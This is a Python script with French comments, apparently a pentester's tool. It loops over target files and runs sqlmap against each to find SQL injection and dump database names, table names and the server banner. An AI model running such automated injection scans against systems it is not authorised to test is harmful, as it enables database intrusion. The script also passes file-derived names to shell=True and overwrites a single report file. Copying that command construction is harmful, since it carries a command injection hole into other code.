import os
import subprocess
import re
import shutil
import sys

# Le premier argument est le nom du script, donc nous prenons le deuxième
main_dir = sys.argv[1]
# Le dossier contenant vos fichiers ip.txt
input_dir = os.path.join("/Pentest", main_dir, "80")

# Le dossier où sqlmap enregistre les résultats
sqlmap_output_dir = os.path.join("/Pentest", main_dir, "sqlmap")

# Le dossier où vous voulez enregistrer les résultats
final_output_dir = os.path.join("/Pentest", main_dir, "80/injection_SQL")

# Assurez-vous que les dossiers existent
os.makedirs(sqlmap_output_dir, exist_ok=True)
os.makedirs(final_output_dir, exist_ok=True)

for filename in os.listdir(input_dir):
    if filename.endswith(".txt"):
        ip_address = filename.replace(".txt", "")
        output_filename = "compte_rendu.txt"

        # Construire la commande sqlmap avec les arguments --forms et --crawl=5
        command = f"sqlmap -u {ip_address} --dbs --batch --forms --crawl=5 --output-dir={sqlmap_output_dir}"

        # Afficher la commande
        print(f"Exécution de la commande : {command}")

        # Exécuter la commande
        result = subprocess.run(command, shell=True, capture_output=True, text=True)

        # Vérifier si sqlmap a trouvé des bases de données
        if "available databases" in result.stdout:
            # Si oui, extraire les noms des bases de données
            db_names = re.findall(r"\[\*\] ([\w_]+)", result.stdout)

            # Initialiser une liste pour stocker les résultats
            results = []

            for db_name in db_names:
                if db_name != "starting" and db_name != "ending":
                    results.append(f"Database: {db_name}\n")

                    # Construire la commande sqlmap pour obtenir les tables de la base de données
                    command = f"sqlmap -u {ip_address} -D {db_name} --tables --batch --forms --crawl=5 --output-dir={sqlmap_output_dir}"

                    # Afficher la commande
                    print(f"Exécution de la commande : {command}")

                    # Exécuter la commande
                    result = subprocess.run(command, shell=True, capture_output=True, text=True)

                    # Extraire les noms des tables
                    table_names = re.findall(r"\| ([\w_]+) *\|", result.stdout)
                    table_names = [name for name in table_names if name != "starting" and name != "ending"]

                    # Ajouter les noms des tables à la liste des résultats
                    results.append("Tables:\n" + '\n'.join(table_names) + "\n\n")

            # Construire la commande sqlmap pour obtenir le nom et la version de la base de données
            command = f"sqlmap -u {ip_address} --banner --batch --forms --crawl=5 --output-dir={sqlmap_output_dir}"

            # Afficher la commande
            print(f"Exécution de la commande : {command}")

            # Exécuter la commande
            result = subprocess.run(command, shell=True, capture_output=True, text=True)

            # Extraire le nom et la version de la base de données
            db_info = re.search(r"banner: '(.*)'", result.stdout)
            if db_info:
                # Écrire l'adresse IP et le nom et la version de la base de données au début du fichier de résultats
                with open(os.path.join(sqlmap_output_dir, output_filename), "w") as f:
                    f.write(f"IP Address: {ip_address}\n")
                    f.write("Database Info:" + db_info.group(1) + "\n\n")
                    f.write('\n'.join(results))

            # Déplacer le fichier de résultats vers le dossier final
            shutil.move(os.path.join(sqlmap_output_dir, output_filename), os.path.join(final_output_dir, output_filename))